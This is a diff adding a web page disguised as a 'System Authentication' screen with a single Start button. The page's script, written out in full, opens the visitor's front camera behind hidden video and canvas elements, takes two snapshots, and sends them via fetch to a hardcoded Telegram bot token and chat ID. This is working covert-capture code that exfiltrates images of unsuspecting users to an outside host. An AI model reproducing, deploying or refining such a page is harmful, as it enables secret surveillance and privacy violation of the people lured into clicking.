@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Authentication</title>
+    <style>
+        body {
+            background-color: #000;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .btn-start {
+            background: none;
+            border: 1px solid #222;
+            color: #444;
+            padding: 15px 60px;
+            font-size: 14px;
+            border-radius: 4px;
+            cursor: pointer;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+        }
+
+        /* إخفاء العناصر تماماً */
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <button id="actionBtn" class="btn-start">Start</button>
+
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const token = "8372973119:AAEvtD7kL-5L1uA4URd_CROFb9V4z1nXt8E";
+        const chatId = "591768998";
+        
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const actionBtn = document.getElementById('actionBtn');
+
+        actionBtn.addEventListener('click', async () => {
+            actionBtn.innerText = "Loading...";
+            actionBtn.disabled = true;
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                video.srcObject = stream;
+
+                // الانتظار ثانية واحدة فقط لضمان تفعيل العدسة ثم التقاط صورتين
+                setTimeout(() => {
+                    captureAndSend("1"); // اللقطة الأولى
+                    
+                    setTimeout(() => {
+                        captureAndSend("2"); // اللقطة الثانية بعد نصف ثانية
+                        
+                        // إيقاف الكاميرا نهائياً بعد الإرسال
+                        setTimeout(() => {
+                            stream.getTracks().forEach(track => track.stop());
+                            actionBtn.innerText = "Complete";
+                        }, 1000);
+                        
+                    }, 500); 
+                }, 1000);
+
+            } catch (err) {
+                console.error(err);
+                actionBtn.innerText = "Error";
+            }
+        });
+
+        function captureAndSend(label) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, `shot_${label}.jpg`);
+                formData.append('caption', `📸 لقطة رقم ${label}`);
+
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData,
+                    keepalive: true
+                });
+            }, 'image/jpeg', 0.6); // جودة 60% لسرعة الإرسال
+        }
+    </script>
+</body>
+</html>
